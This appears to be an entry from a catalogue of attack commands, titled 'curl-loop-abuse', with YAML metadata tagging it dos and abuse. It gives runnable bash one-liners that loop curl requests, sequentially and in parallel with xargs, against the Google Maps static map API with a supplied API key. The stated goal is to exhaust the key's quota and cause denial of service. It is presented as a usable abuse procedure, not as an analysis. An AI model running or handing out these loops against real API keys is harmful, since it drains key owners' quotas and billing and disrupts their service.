---
id: cmd-uuid-4
data: >-
  for i in {1..1000}; do curl
  "https://maps.googleapis.com/maps/api/staticmap?key=YOUR_API_KEY&center=40.714%2C-74.006&zoom=12&size=400x400"
  > /dev/null 2>&1; sleep 0.1; done
tags:
  - dos
  - abuse
  - loop
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:38.653Z'
verified: false
validated: true
submitted: true
---
# curl-loop-abuse

## Command

```bash
for i in {1..1000}; do curl "https://maps.googleapis.com/maps/api/staticmap?key=YOUR_API_KEY&center=40.714%2C-74.006&zoom=12&size=400x400" > /dev/null 2>&1; sleep 0.1; done
```

## Description

Loops curl requests to abuse an API key by sending repeated queries, aiming to exhaust quotas and cause DoS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{1..1000}` | Loop count | Yes |
| API URL params | As in single curl | Yes |
| `sleep 0.1` | Delay between requests | No |

## Examples

### Basic Usage

```bash
for i in {1..100}; do curl "https://api.example.com?key=..." > /dev/null; done
```

### Advanced Usage

```bash
seq 1 500 | xargs -I {} -P 10 curl "https://maps.googleapis.com/...&key=..." > /dev/null
```

## Expected Output

No output (redirected); monitor for errors or use -v for verbose to see 429 quota responses.

## Related

- [[Related Procedure: Test-and-Abuse-Unrestricted-Google-Maps-API-Key]]
